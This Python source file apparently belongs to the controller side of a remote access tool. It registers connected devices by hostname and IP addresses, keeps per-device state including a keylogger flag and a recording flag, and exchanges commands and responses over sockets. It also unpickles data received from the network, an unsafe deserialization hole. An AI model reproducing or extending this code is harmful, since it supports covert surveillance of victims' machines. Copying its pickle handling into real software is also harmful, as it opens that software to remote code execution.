from dataclasses import dataclass
import pickle, hashlib, os, json, copy
import time

from .handler import ClientWrapper
from .bucket import ConnectionBucket

@dataclass
class _clientCacheClass:
    runningKeylogger: bool = False

class ClientDevice(_clientCacheClass):
    def __init__(self, client_data: bytes, socketInstance: ClientWrapper, connectionBucket: ConnectionBucket) -> None:

        _hostname, _publib_address, _local_address = pickle.loads(client_data)
        clientUniqueID: str = hashlib.sha256(str(_hostname + _publib_address + _local_address).encode('UTF-8')).hexdigest()

        if (clientUniqueID not in [client.clientUniqueID for client in connectionBucket.connectionList]):

            if (os.path.exists(cacheName := f'clients/cache/{clientUniqueID}.json')):
                self.clientCacheData = json.loads(open(cacheName, 'r').read())
                self.__dict__ = self.clientCacheData

            else:
                json.dump(_clientCacheClass().__dict__, open(cacheName, 'w'), indent = 2)
                super().__init__()

            connectionBucket.connectionList.append(self)
            socketInstance.send_packet('0')

            self.socket: ClientWrapper = socketInstance

            self.clientUniqueID = clientUniqueID

            self.hostname: str = _hostname
            self.publib_address: str = _publib_address
            self.local_address: str = _local_address

            self.catchingResponse: bytes | None = None
            self.additionalData: dict = dict()
            self.stillRecording: bool = False

    def write_file(self, file_path: str, content: str | bytes, mode: str | None = None) -> None:
        directory = os.path.dirname(file_path)

        if not os.path.exists(directory):
            os.makedirs(directory)

        with open(file = file_path, mode = (mode if mode else ('w' if isinstance(content, str) else 'wb'))) as file:
            file.write(content)
            file.close()

    def set_cache(self) -> None:
        result = {}

        for key, value in self.__dict__.items():
            if key == 'socket':
                break

            result[key] = value

        self.write_file(f'clients/cache/{self.clientUniqueID}.json', '{}')

        json.dump(result,
            open(f'clients/cache/{self.clientUniqueID}.json', 'w'),
            indent = 2
        )

    def catch_response(self, data: str | bytes | None = None) -> bytes:
        if (data):
            self.socket.send_packet(data = data)

            if (isinstance(data, str)):
                data = data.encode('UTF-8')

        while self.catchingResponse is None:
            time.sleep(1)

        result = copy.copy(self.catchingResponse)
        self.catchingResponse = None
        return result
